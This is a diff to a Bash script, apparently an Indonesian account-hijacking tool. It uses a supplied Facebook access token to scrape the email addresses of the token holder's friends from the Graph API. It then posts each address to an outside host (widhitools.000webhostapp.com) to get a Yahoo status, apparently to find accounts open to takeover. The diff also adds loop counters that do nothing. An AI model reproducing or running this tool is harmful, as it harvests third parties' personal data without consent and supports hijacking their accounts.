@@ -8,6 +8,7 @@ GREEN=$(tput setaf 2)
 RED=$(tput setaf 1)
 NORMAL=$(tput sgr0)
 CYAN=$(tput setaf 6)
+time=$(set `date` && echo -e "$5");
 function banner () {
 printf "
 \t$GREEN.__                   
@@ -20,36 +21,32 @@ printf "
 "
 }
 banner
-function get_yahoo () {
-                   get_yahoo=$(curl --silent "http://widhitools.000webhostapp.com/api/yahoo.php?" --data "email=$i" | 
+function get_yahoo(){
+                   get_yahoo=$(curl --silent "http://widhitools.000webhostapp.com/api/yahoo.php?" --data "email=$aa" | 
                    jq -r .status)
-                   printf "$aa > $get_yahoo" >> yahoo.txt
+                   printf "$aa > $get_yahoo" >> output.txt
                    printf "${CYAN}$aa [STATUS] > ${NORMAL}$get_yahoo\n"
 }
 function hey_kamu () {
-	           echo -e -n $RED'[?]'${NORMAL}'Token : ' 
-	           read t0k3n
-	           echo "loading."
-                   sleep 1
-                   echo "loading.."
-                   sleep 1
-                   echo "loading..."
-                   sleep 1
-                   echo "loading...."
-                   sleep 1
-                   echo "loading....."
-                   sleep 1
-                   echo "loading......"
-                   sleep 1
-                   echo "loading......."
-                   sleep 1
-                   gEt=$(curl -Gs "https://graph.facebook.com/v3.2/me/friends/?fields=email&access_token=`cat $t0k3n`&limit=299" | jq -r .data | grep -Po '(?<="email":)[^,]*' | tr -d '""' | 
-                   grep @yahoo.com)
-                   printf "(?)nama folder: "; read name
-                   printf "$gEt\n" >> $name
-                   echo -e -n $RED'[?]'$NORMAL'List here : '; read i
-                   for aa in `cat $i`; do
-                   	 get_yahoo
+	               echo -e -n $RED'[?]'${NORMAL}'Token : ' 
+	               read t0k3n
+	               echo "tunggu bentar.."
+                   gEt=$(curl -Gs "https://graph.facebook.com/v3.2/me/friends/?fields=email&access_token=`cat $t0k3n`&limit=299" | jq -r .data | 
+                   grep -Po '(?<="email":)[^,]*' | tr -d '""')
+                   for aa in $gEt; do
+                       startline=1 ###
+                       endline="12" ###
+                       counter=0
+                       default_threads="10"
+                       threads="${15:-${default_threads}}"
+                       token=$(($counter+1))
+                       let token++
+                       let counter++
+                       let startline+=$threads
+                       let endline+=$threads
+                       #$(($token+threads))
+                       get_yahoo
                    done
 }
-hey_kamu %20
+hey_kamu 
+echo "selesai pada jam : $time"
